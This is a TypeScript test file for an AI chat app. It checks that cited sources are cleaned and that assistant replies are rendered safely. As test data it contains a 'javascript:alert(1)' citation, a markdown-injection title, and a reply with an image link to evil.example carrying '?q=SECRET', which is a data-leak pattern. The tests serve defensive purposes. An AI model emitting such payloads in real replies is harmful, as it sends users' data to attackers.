import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { parseEnvFile } from "../scripts/dev";
import { main as chat } from "../src/app/chat";
import { main as copy } from "../src/app/copy";
import { sourceLine, sourcesOf, sourcesRow } from "../src/core/transcript";
import { allCommands, readConfig } from "../src/features/index";
import { BunHost } from "../src/host/bun";
import { createChat, mutateChat, setCurrent, type Message } from "../src/store/chats";
import { currentChat, ensureCurrentChat } from "../src/store/current-chat";

const repo = resolve(import.meta.dir, "..");
const work = mkdtempSync(join(tmpdir(), "aichat-sources-"));
afterAll(() => rmSync(work, { recursive: true, force: true }));

let counter = 0;
function fresh(extra: Record<string, string> = {}) {
  const dir = join(work, `case-${counter++}`);
  mkdirSync(join(dir, "data"), { recursive: true });
  mkdirSync(join(dir, "cache"), { recursive: true });
  writeFileSync(join(dir, "cache/models.json"), JSON.stringify({ fetchedAt: Date.now(), models: [] }));
  const env = { PATH: process.env.PATH, HOME: join(dir, "home"), ...parseEnvFile(join(repo, "tests/fixtures/dev.env")), alfred_workflow_data: join(dir, "data"), alfred_workflow_cache: join(dir, "cache"), ...extra };
  return { dir, host: (more: Record<string, string> = {}) => new BunHost({ env: { ...env, ...more } }) };
}

const cite = (url: string, title: string) => ({ type: "url_citation" as const, url_citation: { url, title } });

function chatWith(ctx: ReturnType<typeof fresh>, content: string, annotations: Message["annotations"] = []) {
  const host = ctx.host();
  const created = createChat(host, { title: "Cited" });
  setCurrent(host, created.id);
  mutateChat(host, created.id, (c) => {
    c.messages.push({ id: "u", requestId: "r", role: "user", content: "q", attachments: [], status: "ok", createdAt: 1 });
    c.messages.push({ id: "a", requestId: "r", role: "assistant", content, attachments: [], annotations, status: "ok", createdAt: 1 });
  });
}

describe("which sources are cited", () => {
  const message = (annotations: Message["annotations"]): Message => ({ id: "a", requestId: "r", role: "assistant", content: "", attachments: [], annotations, status: "ok", createdAt: 1 });

  test("only https addresses, cleaned of tracking parameters and duplicates", () => {
    const list = sourcesOf(
      message([
        cite("https://www.berlin.de/weather/?utm_source=x", "Berlin"),
        cite("https://www.berlin.de/weather/", "Berlin again"),
        cite("http://insecure.example.com/", "Plain http"),
        cite("javascript:alert(1)", "Script"),
        cite("https://user:pw@example.com/", "Credentials"),
        cite("https://dwd.de/a", ""),
      ]),
    );
    expect(list).toEqual([
      { url: "https://www.berlin.de/weather/", title: "Berlin" },
      { url: "https://dwd.de/a", title: "https://dwd.de/a" },
    ]);
  });

  test("a hostile title cannot start markup in the list or the row", () => {
    const source = { url: "https://example.com/a", title: "x](https://evil.example/) ![p](https://evil.example/p.gif) <img src=y>" };
    const line = sourceLine(source);
    expect(line).toBe("[x\\]\\(https://evil.example/\\) \\!\\[p\\]\\(https://evil.example/p.gif\\) \\<img src=y\\>](https://example.com/a)");
  });
});

describe("the sources row", () => {
  const sources = [
    { url: "https://www.berlin.de/en/weather/", title: "Weather for Berlin" },
    { url: "https://www.dwd.de/DE/wetter/vhs_bbb_node.html;jsessionid=ABC", title: "DWD" },
    { url: "https://berlin.de/other", title: "Same site again" },
    ...Array.from({ length: 9 }, (_, i) => ({ url: `https://site-${i}.example.com/page(1)`, title: `Page ${i}` })),
  ];

  test("short links, one per site, capped, with a pointer to /sources", () => {
    expect(sourcesRow(sources, 3)).toBe(
      "**Sources**  [berlin.de](https://www.berlin.de/en/weather/)  ·  [dwd.de](https://www.dwd.de/DE/wetter/vhs_bbb_node.html;jsessionid=ABC)  ·  [site-0.example.com](https://site-0.example.com/page%281%29)  ·  +8 more with `/sources`",
    );
    expect(sourcesRow(sources.slice(0, 2), 8)).not.toContain("more");
    expect(sourcesRow(sources, 3)).not.toContain("![");
  });
});

describe("in the chat view", () => {
  test("the view shows a row of short links and the copy actions keep a plain list", () => {
    const ctx = fresh();
    chatWith(ctx, "An answer.", Array.from({ length: 12 }, (_, i) => cite(`https://s${i}.example.com/p${i}?utm_source=z`, `Source ${i}`)));
    const view = JSON.parse(chat(ctx.host(), []));
    const row = view.response.split("\n").find((line: string) => line.startsWith("**Sources**"))!;
    expect(row).toContain("[s0.example.com](https://s0.example.com/p0)");
    expect(row).toContain("+4 more with `/sources`");
    expect(row).not.toContain("utm_source");
    expect(row).not.toContain("![");
    const copied = copy(ctx.host({ copy_mode: "all" }), []);
    expect(copied).toContain("**Sources**\n- [Source 0](https://s0.example.com/p0) (s0.example.com)");

    const host = ctx.host();
    const list = allCommands().sources!.run({ host, config: readConfig(host), chat: currentChat(host), ensureChat: () => ensureCurrentChat(host, readConfig(host)) }, "");
    const text = list.kind === "notice" ? list.text : "";
    expect(text.split("\n").filter((line) => /^\d+\. \[/.test(line))).toHaveLength(12);
  });

  test("an injected image, tag, and http link in a reply are shown as text, in the view and in everything copied", () => {
    const ctx = fresh();
    chatWith(ctx, "Done.\n\n![x](https://evil.example/p.gif?q=SECRET)\n\n<img src=\"https://evil.example/t.gif\">\n\n[go](http://evil.example/a)");
    const view = JSON.parse(chat(ctx.host(), []));
    expect(view.response).toContain("🖼 image not loaded: `https://evil.example/p.gif?q=SECRET`");
    expect(view.response).toContain("\\<img src=");
    expect(view.response).toContain("go (`http://evil.example/a`)");
    expect(view.response).not.toMatch(/(^|[^\\])!\[/);
    for (const mode of ["all", "last"]) {
      const copied = copy(ctx.host({ copy_mode: mode }), []);
      expect(copied).not.toMatch(/(^|[^\\])!\[/);
      expect(copied).toContain("image not loaded");
    }
  });

  test("a picture the workflow saved still shows", () => {
    const ctx = fresh({ images_folder: "~/Pictures/AI Chat" });
    const path = join(ctx.dir, "home/Pictures/AI Chat/a.png");
    chatWith(ctx, `![](${path})\n\n📂 \`${path}\``);
    const view = JSON.parse(chat(ctx.host(), []));
    expect(view.response).toContain(`![](${path})`);
  });
});
